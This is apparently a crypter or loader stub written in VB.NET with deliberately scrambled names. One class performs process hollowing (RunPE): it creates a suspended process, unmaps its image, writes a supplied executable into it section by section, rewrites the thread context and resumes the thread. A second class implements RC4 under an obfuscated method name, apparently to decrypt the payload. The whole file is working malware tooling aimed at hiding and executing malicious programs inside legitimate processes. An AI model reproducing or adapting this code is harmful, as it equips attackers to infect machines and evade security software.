Imports System.Text
Imports System.Runtime.InteropServices


Public Class nRUQwszQtZv

    Public Declare Function ccNmSd Lib "kernel32" Alias "LoadLibraryA" (ByVal eNpY As String) As IntPtr

    Public Declare Function ZPIvHg Lib "kernel32" Alias "GetProcAddress" (ByVal HYDS As IntPtr, ByVal eNpY As String) As IntPtr

    Function AKrQtfwNafcuZMC(Of T)(ByVal eNpY As String, ByVal KqIZ As String) As T

        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(ZPIvHg(ccNmSd(eNpY), KqIZ), GetType(T)), Object), T)

    End Function

    Delegate Function NEWbls(ByVal GrSl As IntPtr, ByVal DvsSmCNwq As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Delegate Function LkAypv(ByVal Brcx As IntPtr, ByVal kFPZ As IntPtr) As UInteger

    Delegate Function QzsiG(ByVal Brcx As IntPtr, ByVal kFPZ As IntPtr, ByRef bufr As IntPtr, ByVal bufrLMmOWuIGo As Integer, ByRef VOJv As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Delegate Function beeIJe(ByVal GrSlead As IntPtr, ByVal MQdT As IntPtr) As UInteger

    Delegate Function fYVgva(ByVal GrSl As IntPtr, ByVal DvsSmCNwq As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Delegate Function tJbtGM(ByVal Brcx As IntPtr, ByVal stwV As IntPtr, ByVal LMmOWuIGo As IntPtr, ByVal bGjx As Integer, ByVal otGh As Integer) As IntPtr

    Delegate Function zvCeHG(ByVal Brcxess As IntPtr, ByVal CIHVRDTJu As IntPtr, ByVal DRxr As Byte(), ByVal nLMmOWuIGo As UInteger, ByVal ZmvvugQrs As Integer) As Boolean

    Public Declare Auto Function PYsFhq Lib "kernel32" Alias "CreateProcessW" (ByVal juQs As String, ByVal SHDV As StringBuilder, ByVal EtjHrbVPn As IntPtr, ByVal fvaE As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal vSRP As Boolean, ByVal bvkQ As Integer, ByVal JIXs As IntPtr, ByVal Wwuc As String, ByVal mUlm As Byte(), ByVal SxEo As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean

    Private Function CUONBdg(ByVal EicPHAI As Long, Optional ByVal zHJWqgy As Long = &H4) As Integer

        Dim pPlVVQW As IntPtr

        Dim WrvMNJf As Integer

        Dim dxrbJ As QzsiG = AKrQtfwNafcuZMC(Of QzsiG)("ntdll", "NtReadVirtualMemory")

        Call dxrbJ(Process.GetCurrentProcess.Handle, EicPHAI, pPlVVQW, zHJWqgy, WrvMNJf)

        Return pPlVVQW

    End Function

    Public Function FDZdjwfivt(ByVal RyNzXofs As Byte(), ByVal LHnyduYH As String) As Boolean

        Try

            Dim suFgEOulf As GCHandle = GCHandle.Alloc(RyNzXofs, GCHandleType.Pinned) : Dim hModuleBase As Integer = suFgEOulf.AddrOfPinnedObject : suFgEOulf.Free()

            Dim EtjHrbVPn As IntPtr = IntPtr.Zero

            Dim yORygHbKj As IntPtr() = New IntPtr(3) {}

            Dim PNlNyQemb As Byte() = New Byte(67) {}

            Dim wjwnwJDlS As Integer = BitConverter.ToInt32(RyNzXofs, 60)

            Dim BcfmeCDa As Integer

            Dim DvsSmCNwq As UInteger() = New UInteger(178) {}

            DvsSmCNwq(0) = &H10002

            PYsFhq(Nothing, New StringBuilder(LHnyduYH), EtjHrbVPn, EtjHrbVPn, False, 4, EtjHrbVPn, Nothing, PNlNyQemb, yORygHbKj)

            Dim gcMltzeuu As Integer = (hModuleBase + CUONBdg(hModuleBase + &H3C))

            BcfmeCDa = CUONBdg(gcMltzeuu + &H34)

            Dim pUkmP As LkAypv = AKrQtfwNafcuZMC(Of LkAypv)("ntdll", "NtUnmapViewOfSection")

            pUkmP(yORygHbKj(0), BcfmeCDa)

            Dim VxDnC As tJbtGM = AKrQtfwNafcuZMC(Of tJbtGM)("kernel32", "VirtualAllocEx")

            Dim CIHVRDTJu As IntPtr = VxDnC(yORygHbKj(0), BcfmeCDa, CUONBdg(gcMltzeuu + &H50), &H3000, &H40)

            Dim utTLfsQD As New IntPtr(BitConverter.ToInt32(RyNzXofs, wjwnwJDlS + &H34))

            Dim LMmOWuIGo As New IntPtr(BitConverter.ToInt32(RyNzXofs, wjwnwJDlS + 80))

            Dim bSXQaEhxM As Integer

            Dim ZmvvugQrs As Integer

            Dim api8 As zvCeHG = AKrQtfwNafcuZMC(Of zvCeHG)("ntdll", "NtWriteVirtualMemory")

            api8(yORygHbKj(0), CIHVRDTJu, RyNzXofs, CUInt(CInt(CUONBdg(gcMltzeuu + &H54))), bSXQaEhxM)

            For i = 0 To CUONBdg(gcMltzeuu + &H6, 2) - 1

                Dim PSkesQOmA As Integer() = New Integer(9) {}

                Buffer.BlockCopy(RyNzXofs, (wjwnwJDlS + &HF8) + (i * 40), PSkesQOmA, 0, 40)

                Dim kiJBOVjaG As Byte() = New Byte((PSkesQOmA(4) - 1)) {}

                Buffer.BlockCopy(RyNzXofs, PSkesQOmA(5), kiJBOVjaG, 0, kiJBOVjaG.Length)

                LMmOWuIGo = New IntPtr(CIHVRDTJu.ToInt32() + PSkesQOmA(3))

                utTLfsQD = New IntPtr(kiJBOVjaG.Length)

                api8(yORygHbKj(0), LMmOWuIGo, kiJBOVjaG, CUInt(utTLfsQD), ZmvvugQrs)

            Next i

            Dim WmwvT As NEWbls = AKrQtfwNafcuZMC(Of NEWbls)("ntdll", "NtGetContextThread")

            WmwvT(yORygHbKj(1), DvsSmCNwq)

            api8(yORygHbKj(0), DvsSmCNwq(41) + &H8, BitConverter.GetBytes(CIHVRDTJu.ToInt32()), CUInt(&H4), ZmvvugQrs)

            DvsSmCNwq(&H2C) = BcfmeCDa + CUONBdg(gcMltzeuu + &H28)

            Dim MFfmh As fYVgva = AKrQtfwNafcuZMC(Of fYVgva)("ntdll", "NtSetContextThread")

            MFfmh(yORygHbKj(1), DvsSmCNwq)

            Dim AomsW As beeIJe = AKrQtfwNafcuZMC(Of beeIJe)("ntdll", "NtResumeThread")

            AomsW(yORygHbKj(1), 0)

        Catch ex As Exception

            Return False

        End Try

        Return True

    End Function

End Class

Public Class Class1
    Public Shared Function ɯɫɔȪɑɦᾝᾂὭὝᾃᾔᾚᾧᾣὧὯᾅῇ(ByVal message As String, ByVal password As String) As String
        Dim i As Integer = 0
        Dim j As Integer = 0
        Dim cipher As New StringBuilder
        Dim returnCipher As String = String.Empty
        Dim sbox As Integer() = New Integer(256) {}
        Dim key As Integer() = New Integer(256) {}
        Dim intLength As Integer = password.Length
        Dim a As Integer = 0
        While a <= 255
            Dim ctmp As Char = (password.Substring((a Mod intLength), 1).ToCharArray()(0))
            key(a) = Microsoft.VisualBasic.Strings.Asc(ctmp)
            sbox(a) = a
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While
        Dim x As Integer = 0
        Dim b As Integer = 0
        While b <= 255
            x = (x + sbox(b) + key(b)) Mod 256
            Dim tempSwap As Integer = sbox(b)
            sbox(b) = sbox(x)
            sbox(x) = tempSwap
            System.Math.Max(System.Threading.Interlocked.Increment(b), b - 1)
        End While
        a = 1
        While a <= message.Length
            Dim itmp As Integer = 0
            i = (i + 1) Mod 256
            j = (j + sbox(i)) Mod 256
            itmp = sbox(i)
            sbox(i) = sbox(j)
            sbox(j) = itmp
            Dim k As Integer = sbox((sbox(i) + sbox(j)) Mod 256)
            Dim ctmp As Char = message.Substring(a - 1, 1).ToCharArray()(0)
            itmp = Asc(ctmp)
            Dim cipherby As Integer = itmp Xor k
            cipher.Append(Chr(cipherby))
            System.Math.Max(System.Threading.Interlocked.Increment(a), a - 1)
        End While
        returnCipher = cipher.ToString
        cipher.Length = 0
        Return returnCipher
    End Function
End Class
